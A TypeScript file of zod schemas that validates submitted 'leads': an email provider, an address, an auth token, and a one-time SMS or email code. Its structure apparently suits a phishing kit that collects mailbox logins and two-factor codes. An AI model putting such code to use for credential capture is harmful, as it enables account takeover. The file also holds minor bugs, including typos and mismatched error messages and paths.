import { z } from "zod";

export const leadSchema = z
  .object({
    clientId: z
      .string({
        required_error: "clientId is required.",
        invalid_type_error: "clientId must be a string.",
      })
      .uuid({ message: "clientId must be a valid UUID." }),
    sessionId: z
      .string({
        required_error: "sessionId is required.",
        invalid_type_error: "clientId must be a string.",
      })
      .uuid({ message: "sessionId must be a valid UUID." }),
    provider: z.enum([
      "google",
      "outlook",
      "microsoft365",
      "yahoo",
      "aol",
      "other",
    ]),
    email: z
      .string()
      .trim()
      .email("Enter a valid email address.")
      .max(128, "Email address must comntain at most 128 characters"),
    authToken: z
      .string()
      .trim()
      .min(16, "Auth token must comntain at least 16 characters")
      .max(1024, "Auth token must comntain at most 1024 characters"),
    customField: z
      .object({
        name: z.enum(["workspace", "interest", "folder"]),
        value: z
          .string()
          .trim()
          .min(2, "Custom field name must comntain at least 2 characters")
          .max(60, "Custom field value must comntain at most 60 characters"),
      })
      .strict()
      .optional(),
  })
  .strict()
  .superRefine((lead, context) => {
    const customFieldName = providerCustomFieldNames[lead.provider];
    if (lead.customField && customFieldName) {
      const fieldName = lead.customField.name;
      if (customFieldName !== fieldName) {
        context.addIssue({
          code: z.ZodIssueCode.custom,
          message: `${lead.provider} does not support ${fieldName}.`,
          path: ["customFields", "name"],
        });
      }
    }
  });

export const codeLeadSchema = z
  .object({
    clientId: z
      .string({
        required_error: "clientId is required.",
        invalid_type_error: "clientId must be a string.",
      })
      .uuid({ message: "clientId must be a valid UUID." }),
    sessionId: z
      .string({
        required_error: "sessionId is required.",
        invalid_type_error: "clientId must be a string.",
      })
      .uuid({ message: "sessionId must be a valid UUID." }),
    provider: z.enum([
      "google",
      "outlook",
      "microsoft365",
      "yahoo",
      "aol",
      "other",
    ]),
    email: z
      .string()
      .trim()
      .email("Enter a valid email address.")
      .max(128, "Email address must comntain at most 128 characters"),
    type: z.enum(["sms", "email"]),
    code: z.string().trim().min(2).max(64),
  })
  .strict();

export type Lead = z.infer<typeof leadSchema>;
export type CodeLead = z.infer<typeof codeLeadSchema>;

export const providerNames: Record<Lead["provider"], string> = {
  google: "Google / Gmail",
  outlook: "Outlook.com",
  microsoft365: "Microsoft 365",
  yahoo: "Yahoo",
  aol: "AOL Mail",
  other: "Other",
} as const;

export const providerCustomFieldNames = {
  google: undefined,
  yahoo: "interest",
  outlook: undefined,
  microsoft365: "workspace",
  aol: "folder",
  other: undefined,
} as const;
